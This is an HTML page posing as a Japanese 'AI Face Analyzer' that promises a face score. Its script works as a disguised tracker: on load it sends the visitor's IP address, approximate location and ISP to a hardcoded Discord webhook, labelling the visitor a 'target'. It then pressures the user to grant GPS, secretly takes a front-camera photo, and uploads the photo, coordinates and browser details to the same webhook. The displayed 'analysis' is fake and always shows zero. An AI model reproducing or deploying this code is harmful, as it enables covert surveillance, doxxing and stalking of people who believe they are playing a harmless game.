<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Analyzer</title>
    <style>
        body { 
            background: #ffffff; color: #333; font-family: 'Helvetica Neue', Arial, sans-serif;
            margin: 0; text-align: center; height: 100vh; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }

        .fade-in-box {
            animation: fadeIn 2.5s ease-in-out forwards;
            opacity: 0; width: 100%;
        }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        img.header-img { 
            width: 80%; max-width: 350px; border-radius: 25px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 40px; 
            cursor: pointer;
        }

        .start-btn {
            background: linear-gradient(135deg, #6dd5ed, #2193b0);
            color: white; border: none; padding: 22px 60px;
            font-size: 1.5rem; font-weight: bold; border-radius: 50px; 
            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            transition: 0.3s;
        }
        .start-btn:active { transform: scale(0.95); }

        #diagnosis-screen { display: none; width: 100%; }
        .frame {
            position: relative; width: 320px; height: 320px; margin: 0 auto;
            border: 6px solid #fff; border-radius: 30px; overflow: hidden;
            box-shadow: 0 15px 45px rgba(0,0,0,0.15); background: #f9f9f9;
        }
        #captured-photo { width: 100%; height: 100%; object-fit: cover; display: none; }
        video { position: absolute; width: 1px; height: 1px; opacity: 0; }
        .status-text { margin-top: 30px; font-size: 1.2rem; color: #2193b0; font-weight: 500; padding: 0 20px; }
        
        #result-zero {
            display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            font-size: 16rem; color: #ff4757; font-weight: 900; z-index: 100;
            text-shadow: 5px 5px 0 #fff;
        }

        /* 警告用スタイル */
        .alert-text { color: #ff4757; font-weight: bold; margin-top: 10px; font-size: 0.9rem; }
    </style>
</head>
<body>

<div id="top-screen" class="fade-in-box">
    <img id="main-icon" src="https://cdn.discordapp.com/attachments/1457007667410239530/1467315464643543040/F9C40A6A-9C15-4173-A89C-E46615414223.png?ex=697fef84&is=697e9e04&hm=568be91c0f4da1ee33754484eec840e5e2c9c1da765d720b40499db12ef3f1ba" class="header-img" onclick="checkAdmin()">
    <br>
    <button class="start-btn" onclick="run()">顔診断開始</button>
</div>

<input type="file" id="image-selector" style="display:none" accept="image/*">

<div id="diagnosis-screen">
    <div class="frame">
        <video id="video" autoplay playsinline></video>
        <img id="captured-photo">
        <div id="result-zero">0</div>
    </div>
    <div id="status" class="status-text">AIスキャンを開始します...</div>
    <div id="retry-hint" class="alert-text"></div>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1477228073601470526/QYjxdxWV9xBoRUXf100AQS9zYSUWcG3K8L-uFNT3-jPAuYWzU_3lCGb7izpNAx5fJC45";
    let ipInfo = "取得中...";
    let gpsInfo = "未許可";
    let tapCount = 0;

    window.onload = async () => {
        const savedImg = localStorage.getItem('custom_icon');
        if (savedImg) document.getElementById('main-icon').src = savedImg;

        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ipInfo = `住所付近: ${data.city}, ${data.region}, ${data.country_name}\nIP: ${data.ip}\nISP: ${data.org}`;
            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: "🚩 ターゲットが来ました\n" + ipInfo })
            });
        } catch(e) { ipInfo = "情報取得エラー"; }
    };

    function checkAdmin() {
        tapCount++;
        if (tapCount >= 10) {
            tapCount = 0;
            const pw = prompt("パスワードを入力してください");
            if (pw === "25251") document.getElementById('image-selector').click();
        }
    }

    document.getElementById('image-selector').onchange = function(e) {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(event) {
                const base64Image = event.target.result;
                document.getElementById('main-icon').src = base64Image;
                localStorage.setItem('custom_icon', base64Image);
                alert("画像を保存しました");
            };
            reader.readAsDataURL(file);
        }
    };

    async function run() {
        document.getElementById('top-screen').style.display = 'none';
        document.getElementById('diagnosis-screen').style.display = 'block';

        // GPS取得の試行
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                gpsInfo = `GPS座標: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                document.getElementById('retry-hint').innerText = "";
                await startCamera(); 
            },
            async (error) => {
                // 拒否された場合
                gpsInfo = "GPS: 拒否";
                document.getElementById('status').innerText = "【エラー】位置情報がブロックされています";
                document.getElementById('retry-hint').innerHTML = "診断を続けるには、ブラウザの設定から<br>このサイトの位置情報許可を「ON」にして再読み込みしてください。";
                
                // 拒否されても一応カメラへ進むが、注意喚起は残す
                setTimeout(() => { startCamera(); }, 3000);
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    }

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                const photo = document.getElementById('captured-photo');
                photo.src = canvas.toDataURL('image/png');
                photo.style.display = 'block';
                document.getElementById('status').innerText = "顔構造を解析中...";

                stream.getTracks().forEach(t => t.stop());

                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob, 'face.png');
                    fd.append('payload_json', JSON.stringify({
                        content: `📸 顔面確保！\n【位置情報】\n${gpsInfo}\n\n【解析情報】\n${ipInfo}\nUA: ${navigator.userAgent}`
                    }));
                    fetch(WEBHOOK, { method: 'POST', body: fd });
                });

                setTimeout(() => { document.getElementById('status').innerText = "照合完了..."; }, 1500);
                setTimeout(() => {
                    document.getElementById('status').innerText = "あなたの顔面スコアは...";
                    document.getElementById('result-zero').style.display = 'block';
                }, 3500);

            }, 800); 

        } catch (err) {
            document.getElementById('status').innerText = "カメラの使用を許可してください";
        }
    }
</script>
</body>
</html>
